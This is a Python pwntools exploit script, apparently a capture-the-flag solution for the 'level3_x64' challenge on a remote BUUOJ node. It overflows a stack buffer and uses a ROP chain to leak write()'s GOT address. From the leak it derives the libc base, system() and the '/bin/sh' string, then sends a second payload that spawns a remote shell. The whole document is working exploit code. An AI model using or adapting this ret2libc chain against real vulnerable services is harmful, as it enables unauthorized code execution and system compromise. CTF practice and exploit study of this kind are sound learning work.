from pwn import *

r = remote('node5.buuoj.cn', 26567)
# r = process(r'./level3_x64')
elf = ELF(r'../../pwn_file/level3_x64')
libc = ELF(r'../libc/libc6_2.23-0ubuntu11_amd64.so')

context.log_level = 'debug'

vuln_addr = 0x4005E6
main_addr = 0x40061A
write_plt = elf.plt['write']
write_got = elf.got['write']
pop_rdi = 0x4006b3
pop_rsi_r15 = 0x4006b1
ret_addr = 0x400499

#gdb.attach(r, 'b *0x4005E6')

payload = b'A' * 0x80 + b'B' * 8 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(8) + p64(write_plt) + p64(vuln_addr)
r.sendlineafter(b'Input:\n', payload)
write_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(f"write_addr: {hex(write_addr)}")

base_addr = write_addr - libc.sym['write']
system_addr = base_addr + libc.sym['system']
sh_addr = base_addr + libc.search(b'/bin/sh').__next__()
print(f"system_addr: {hex(system_addr)}")
print(f"sh_addr: {hex(sh_addr)}")


payload2 = b'A' * 0x80 + b'B' * 8 + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)
r.sendlineafter(b'Input:\n', payload2)
r.interactive()
